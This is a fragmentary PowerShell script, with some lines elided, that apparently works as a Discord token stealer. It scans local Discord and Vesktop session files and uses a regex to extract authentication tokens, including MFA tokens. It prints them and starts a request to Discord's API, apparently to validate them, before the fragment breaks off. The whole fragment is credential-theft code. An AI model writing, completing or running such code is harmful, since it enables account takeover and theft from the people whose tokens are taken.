...
$tmpTag=""
$possibleTokens = @()
#$discordPath = "C:\Users\AROAH\APPDATA\Roaming\vesktop\sessiondata"
...
if ( Test-Path -LiteralPath $stable ) {
    ...
    Foreach ($file in $files)
    {
        ...
        if ($mfa.length -gt 1) {
            ...
            $user=""
            $r=""
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            echo $tkn
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
